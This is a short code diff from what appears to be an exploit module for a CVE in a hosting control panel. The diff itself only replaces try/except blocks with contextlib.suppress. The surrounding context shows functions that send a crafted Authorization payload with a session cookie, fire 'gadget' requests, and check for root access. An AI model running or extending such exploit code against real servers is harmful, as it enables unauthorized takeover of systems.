@@ -9,6 +9,7 @@ import json
 import os
 import random
 import re
+from contextlib import suppress
 from typing import Any, Dict, List, Optional
 
 from cpointed.core.engine import Target, TargetType
@@ -201,18 +202,14 @@ class CVE202641940(VulnerabilityModule):
         timeout: float,
     ) -> None:
         headers = {"Cookie": f"whostmgrsession={session}", "Authorization": payload}
-        try:
+        with suppress(SessionError):
             await client.request("GET", "/", headers=headers, timeout=timeout)
-        except SessionError:
-            pass
 
     async def _trigger_denial(self, client: CPointedClient, session: str, timeout: float) -> None:
         for gadget in self.GADGETS:
             headers = {"Cookie": f"whostmgrsession={session}"}
-            try:
+            with suppress(SessionError):
                 await client.request("GET", gadget, headers=headers, timeout=timeout)
-            except SessionError:
-                pass
             await asyncio.sleep(0.3)
 
     async def _verify_root(self, client: CPointedClient, session: str, timeout: float) -> bool:
